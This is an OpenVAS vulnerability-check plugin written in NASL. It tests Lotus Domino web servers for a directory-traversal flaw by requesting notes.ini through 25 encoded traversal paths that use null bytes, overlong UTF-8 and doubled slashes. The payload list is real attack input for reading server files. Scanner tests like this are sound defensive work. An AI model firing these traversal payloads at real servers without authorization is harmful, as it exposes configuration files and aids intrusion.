###############################################################################
# OpenVAS Vulnerability Test
# $Id: notesinicheck.nasl 13679 2019-02-15 08:20:11Z cfischer $
#
# notes.ini checker
#
# Authors:
# Hemil Shah
#
# Copyright:
# Copyright (C) 2000 - 2004 Net-Square Solutions Pvt Ltd.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Desc: This script will check for the notes.ini file in the remote web server.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.12248");
  script_version("$Revision: 13679 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-15 09:20:11 +0100 (Fri, 15 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("notes.ini checker");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2004 Net-Square Solutions Pvt Ltd.");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("Domino/banner");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/101/155904/2001-01-08/2001-01-14/0");

  script_tag(name:"summary", value:"This plugin attempts to determine the existence of a directory
  traversal bug on the remote Lotus Domino Web server");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
host = http_host_name(dont_add_port:TRUE);
if(http_get_no404_string(port:port, host:host)) exit(0);

banner = get_http_banner(port:port);
if ( "Domino" >!< banner ) exit(0);

req = http_get(item:"../../../../whatever.ini", port:port);
res = http_keepalive_send_recv(port:port, data:req);
if(isnull(res)) exit(0);

if (ereg(pattern:"^HTTP/[01]\.[01] 200 ", string:res)  ) exit (0);

dirs[0] = "/%00%00.nsf/../lotus/domino/notes.ini";
dirs[1] = "/%00%20.nsf/../lotus/domino/notes.ini";
dirs[2] = "/%00%c0%af.nsf/../lotus/domino/notes.ini";
dirs[3] = "/%00...nsf/../lotus/domino/notes.ini";
dirs[4] = "/%00.nsf//../lotus/domino/notes.ini";
dirs[5] = "/%00.nsf/../lotus/domino/notes.ini";
dirs[6] = "/%00.nsf/..//lotus/domino/notes.ini";
dirs[7] = "/%00.nsf/../../lotus/domino/notes.ini";
dirs[8] = "/%00.nsf.nsf/../lotus/domino/notes.ini";
dirs[9] = "/%20%00.nsf/../lotus/domino/notes.ini";
dirs[10] = "/%20.nsf//../lotus/domino/notes.ini";
dirs[11] = "/%20.nsf/..//lotus/domino/notes.ini";
dirs[12] = "/%c0%af%00.nsf/../lotus/domino/notes.ini";
dirs[13] = "/%c0%af.nsf//../lotus/domino/notes.ini";
dirs[14] = "/%c0%af.nsf/..//lotus/domino/notes.ini";
dirs[15] = "/...nsf//../lotus/domino/notes.ini";
dirs[16] = "/...nsf/..//lotus/domino/notes.ini";
dirs[17] = "/.nsf///../lotus/domino/notes.ini";
dirs[18] = "/.nsf//../lotus/domino/notes.ini";
dirs[19] = "/.nsf//..//lotus/domino/notes.ini";
dirs[20] = "/.nsf/../lotus/domino/notes.ini";
dirs[21] = "/.nsf/../lotus/domino/notes.ini";
dirs[22] = "/.nsf/..///lotus/domino/notes.ini";
dirs[23] = "/.nsf%00.nsf/../lotus/domino/notes.ini";
dirs[24] = "/.nsf.nsf//../lotus/domino/notes.ini";

report = string("The Lotus Domino Web server is vulnerable to a directory-traversal attack\n");

for(i=0; dirs[i]; i++) {

  req = http_get(item:dirs[i], port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if(isnull(res)) exit(0);

  if(ereg(pattern:"^HTTP/[01]\.[01] 200 ", string:res)){
    if("DEBUG" >< res){
      report += string("specifically, the request for ", dirs[i], " appears\n");
      report += string("to have retrieved the notes.ini file.");
      security_message(port:port, data:report);
      exit(0);
    }
  }
}
